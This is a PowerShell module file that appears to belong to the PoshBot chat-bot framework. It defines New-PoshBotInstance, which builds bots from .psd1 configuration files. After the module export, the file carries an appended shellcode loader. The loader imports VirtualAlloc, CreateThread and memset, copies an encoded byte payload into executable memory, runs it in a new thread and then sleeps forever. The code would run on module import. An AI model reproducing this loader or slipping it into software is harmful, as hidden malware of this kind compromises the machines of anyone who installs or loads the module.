
function New-PoshBotInstance {
    
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '', Scope='Function', Target='*')]
    [cmdletbinding(DefaultParameterSetName = 'path')]
    param(
        [parameter(
            Mandatory,
            ParameterSetName  = 'Path',
            Position = 0,
            ValueFromPipeline,
            ValueFromPipelineByPropertyName
        )]
        [ValidateNotNullOrEmpty()]
        [SupportsWildcards()]
        [string[]]$Path,

        [parameter(
            Mandatory,
            ParameterSetName = 'LiteralPath',
            Position = 0,
            ValueFromPipelineByPropertyName
        )]
        [ValidateNotNullOrEmpty()]
        [Alias('PSPath')]
        [string[]]$LiteralPath,

        [parameter(
            Mandatory,
            ParameterSetName = 'config',
            ValueFromPipeline,
            ValueFromPipelineByPropertyName
        )]
        [BotConfiguration[]]$Configuration,

        [parameter(Mandatory)]
        [Backend]$Backend
    )

    begin {
        $here = $PSScriptRoot
    }

    process {
        if ($PSCmdlet.ParameterSetName -eq 'path' -or $PSCmdlet.ParameterSetName -eq 'LiteralPath') {
            
            if ($PSCmdlet.ParameterSetName -eq 'Path') {
                $paths = Resolve-Path -Path $Path | Select-Object -ExpandProperty Path
            } elseif ($PSCmdlet.ParameterSetName -eq 'LiteralPath') {
                $paths = Resolve-Path -LiteralPath $LiteralPath | Select-Object -ExpandProperty Path
            }

            $Configuration = @()
            foreach ($item in $paths) {
                if (Test-Path $item) {
                    if ( (Get-Item -Path $item).Extension -eq '.psd1') {
                        $Configuration += Get-PoshBotConfiguration -Path $item
                    } else {
                        Throw 'Path must be to a valid .psd1 file'
                    }
                } else {
                    Write-Error -Message "Path [$item] is not valid."
                }
            }
        }

        foreach ($config in $Configuration) {
            Write-Verbose -Message "Creating bot instance with name [$($config.Name)]"
            [Bot]::new($Backend, $here, $config)
        }
    }
}

Export-ModuleMember -Function 'New-PoshBotInstance'

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd7,0xd9,0x74,0x24,0xf4,0xba,0xdd,0xb3,0xf8,0x2f,0x5e,0x2b,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x21,0x51,0x0d,0xd3,0x31,0x14,0xee,0x2c,0xc1,0x79,0x66,0xc9,0xf0,0xb9,0x1c,0x99,0xa2,0x09,0x56,0xcf,0x4e,0xe1,0x3a,0xe4,0xc5,0x87,0x92,0x0b,0x6e,0x2d,0xc5,0x22,0x6f,0x1e,0x35,0x24,0xf3,0x5d,0x6a,0x86,0xca,0xad,0x7f,0xc7,0x0b,0xd3,0x72,0x95,0xc4,0x9f,0x21,0x0a,0x61,0xd5,0xf9,0xa1,0x39,0xfb,0x79,0x55,0x89,0xfa,0xa8,0xc8,0x82,0xa4,0x6a,0xea,0x47,0xdd,0x22,0xf4,0x84,0xd8,0xfd,0x8f,0x7e,0x96,0xff,0x59,0x4f,0x57,0x53,0xa4,0x60,0xaa,0xad,0xe0,0x46,0x55,0xd8,0x18,0xb5,0xe8,0xdb,0xde,0xc4,0x36,0x69,0xc5,0x6e,0xbc,0xc9,0x21,0x8f,0x11,0x8f,0xa2,0x83,0xde,0xdb,0xed,0x87,0xe1,0x08,0x86,0xb3,0x6a,0xaf,0x49,0x32,0x28,0x94,0x4d,0x1f,0xea,0xb5,0xd4,0xc5,0x5d,0xc9,0x07,0xa6,0x02,0x6f,0x43,0x4a,0x56,0x02,0x0e,0x02,0x9b,0x2f,0xb1,0xd2,0xb3,0x38,0xc2,0xe0,0x1c,0x93,0x4c,0x48,0xd4,0x3d,0x8a,0xaf,0xcf,0xfa,0x04,0x4e,0xf0,0xfa,0x0d,0x94,0xa4,0xaa,0x25,0x3d,0xc5,0x20,0xb6,0xc2,0x10,0xe6,0xe6,0x6c,0xcb,0x47,0x57,0xcc,0xbb,0x2f,0xbd,0xc3,0xe4,0x50,0xbe,0x0e,0x8d,0xfb,0x44,0xd8,0xc3,0x5c,0xb6,0xa3,0x4c,0xa1,0x37,0xd9,0x19,0x2c,0xd1,0xb7,0x31,0x79,0x49,0x2f,0xab,0x20,0x01,0xce,0x34,0xff,0x6f,0xd0,0xbf,0x0c,0x8f,0x9e,0x37,0x78,0x83,0x76,0xb8,0x37,0xf9,0xd0,0xc7,0xed,0x94,0xdc,0x5d,0x0a,0x3f,0x8b,0xc9,0x10,0x66,0xfb,0x55,0xea,0x4d,0x70,0x5f,0x7e,0x2e,0xee,0xa0,0x6e,0xae,0xee,0xf6,0xe4,0xae,0x86,0xae,0x5c,0xfd,0xb3,0xb0,0x48,0x91,0x68,0x25,0x73,0xc0,0xdd,0xee,0x1b,0xee,0x38,0xd8,0x83,0x11,0x6f,0xd8,0xf8,0xc7,0x49,0xae,0x10,0xd4;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};
